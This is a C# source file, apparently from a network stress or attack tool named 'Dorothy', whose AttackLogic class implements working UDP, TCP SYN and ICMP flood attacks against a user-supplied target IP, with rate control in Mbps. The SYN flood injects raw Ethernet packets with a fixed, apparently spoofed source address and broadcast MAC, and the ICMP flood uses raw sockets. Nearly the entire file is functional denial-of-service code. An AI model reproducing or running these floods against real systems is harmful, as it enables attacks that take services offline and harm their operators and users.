using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using System.Diagnostics; // Added for Stopwatch
using System.Security.Principal; // Added for WindowsIdentity and WindowsPrincipal
using SharpPcap;
using PacketDotNet;

namespace Dorothy
{
    public class AttackLogic
    {
        private volatile bool _stopAttack = false;

        // Method to start the UDP flood
        public Task StartUdpFlood(string targetIp, int targetPort, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartUdpFlood method");
            return Task.Run(async () =>
            {
                try
                {
                    log($"Debug: Creating UdpClient");
                    using (UdpClient udpClient = new UdpClient())
                    {
                        IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), targetPort);
                        log($"Debug: Target endpoint created: {targetEndpoint}");

                        byte[] buffer = new byte[1024]; // 1KB packet size
                        new Random().NextBytes(buffer); // Fill buffer with random data
                        log($"Debug: Buffer created with size: {buffer.Length}");

                        long packetsSent = 0;
                        long bytesPerSecond = mbps * 125000L; // Convert Mbps to bytes per second
                        long bytesSent = 0;
                        DateTime startTime = DateTime.Now;

                        log($"Debug: UDP Flood initialized. Target: {targetEndpoint}, BytesPerSecond: {bytesPerSecond}");

                        while (!_stopAttack)
                        {
                            udpClient.Send(buffer, buffer.Length, targetEndpoint);
                            bytesSent += buffer.Length;
                            packetsSent++;

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: UDP Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: UDP Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    await Task.Delay(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            await Task.Delay((int)delay);
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"Debug: UDP Flood error: {ex.Message}");
                    log($"Debug: Stack trace: {ex.StackTrace}");
                }
                finally
                {
                    log("Debug: UDP Flood attack stopped.");
                }

                return Task.CompletedTask;
            });
        }

        // Method to start the TCP SYN flood
        public Task StartTcpSynFlood(string targetIp, int targetPort, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartTcpSynFlood method");

            return Task.Run(() =>
            {
                IInjectionDevice? device = null; // Declare device outside try block

                try
                {
                    var devices = CaptureDeviceList.Instance;
                    if (devices.Count < 1)
                    {
                        log("Error: No devices were found on this machine");
                        return Task.CompletedTask;
                    }

                    device = devices[0] as IInjectionDevice; // Attempt to cast to IInjectionDevice
                    if (device == null)
                    {
                        log("Error: Selected device is not an injection device or is null");
                        return Task.CompletedTask;
                    }

                    device.Open(DeviceModes.Promiscuous, 1000);

                    var srcIp = IPAddress.Parse("192.168.1.100");
                    if (!IPAddress.TryParse(targetIp, out IPAddress? dstIp))
                    {
                        log($"Error: Invalid target IP address: {targetIp}");
                        return Task.CompletedTask;
                    }
                    var srcPort = 12345;

                    long packetsSent = 0;
                    long bytesPerSecond = mbps * 125000L;
                    long bytesSent = 0;
                    DateTime startTime = DateTime.Now;

                    log($"Debug: TCP SYN Flood initialized. Target: {targetIp}:{targetPort}, BytesPerSecond: {bytesPerSecond}");

                    while (!_stopAttack)
                    {
                        try
                        {
                            EthernetPacket ethernetPacket = new EthernetPacket(
                                device.MacAddress, 
                                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), 
                                EthernetType.IPv4
                            );

                            IPv4Packet ipPacket = new IPv4Packet(srcIp, dstIp)
                            {
                                TimeToLive = 64,
                                Protocol = PacketDotNet.ProtocolType.Tcp // Fully qualified ProtocolType
                            };

                            TcpPacket tcpPacket = new TcpPacket((ushort)srcPort, (ushort)targetPort)
                            {
                                SequenceNumber = 100,
                                WindowSize = 8192,
                                Flags = PacketDotNet.TcpFlags.Syn // Fully qualified TcpFlags
                            };

                            ipPacket.PayloadPacket = tcpPacket;
                            ethernetPacket.PayloadPacket = ipPacket;

                            device.SendPacket(ethernetPacket);
                            packetsSent++;
                            bytesSent += ethernetPacket.Bytes.Length;

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: TCP SYN Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: TCP SYN Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    Thread.Sleep(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (ethernetPacket.Bytes.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            Thread.Sleep((int)delay);
                        }
                        catch (Exception ex)
                        {
                            log($"TCP SYN Flood error: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"TCP SYN Flood error: {ex.Message}");
                }
                finally
                {
                    log("Debug: TCP SYN Flood attack stopped.");
                    device?.Close(); // Safely close the device if it's not null
                }

                return Task.CompletedTask;
            });
        }

        // Method to start the ICMP flood
        public Task StartIcmpFlood(string targetIp, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartIcmpFlood method");

            return Task.Run(async () =>
            {
                try
                {
                    log($"Debug: Creating raw socket for ICMP");
                    using (Socket icmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
                    {
                        IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), 0);
                        byte[] buffer = new byte[1024]; // 1KB packet size
                        new Random().NextBytes(buffer); // Fill buffer with random data
                        log($"Debug: Buffer created with size: {buffer.Length}");

                        long packetsSent = 0;
                        long bytesPerSecond = mbps * 125000L; // Convert Mbps to bytes per second
                        long bytesSent = 0;
                        DateTime startTime = DateTime.Now;

                        log($"Debug: ICMP Flood initialized. Target: {targetIp}, BytesPerSecond: {bytesPerSecond}");

                        while (!_stopAttack)
                        {
                            try
                            {
                                icmpSocket.SendTo(buffer, targetEndpoint);
                                packetsSent++;
                                bytesSent += buffer.Length;
                            }
                            catch (SocketException ex)
                            {
                                log($"ICMP Flood error: {ex.Message}");
                            }

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: ICMP Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: ICMP Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    await Task.Delay(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            if (delay > 0)
                            {
                                await Task.Delay((int)delay);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"Debug: ICMP Flood error: {ex.Message}");
                    log($"Debug: Stack trace: {ex.StackTrace}");
                    return Task.CompletedTask;
                }
                finally
                {
                    log("Debug: ICMP Flood attack stopped.");
                }

                return Task.CompletedTask;
            });
        }

        private string? GetLocalIpAddress(SharpPcap.LibPcap.LibPcapLiveDevice? device)
        {
            if (device == null)
                return null;

            var addresses = device.Addresses;
            foreach (var addr in addresses)
            {
                if (addr.Addr.ipAddress != null && addr.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                {
                    return addr.Addr.ipAddress.ToString();
                }
            }
            return null;
        }

        private int GetAvailablePort()
        {
            var listener = new TcpListener(IPAddress.Any, 0);
            listener.Start();
            int port = ((IPEndPoint)listener.LocalEndpoint).Port;
            listener.Stop();
            return port;
        }

        public void StopAttack()
        {
            _stopAttack = true;
        }

        private bool IsRunningAsAdmin()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
    }
}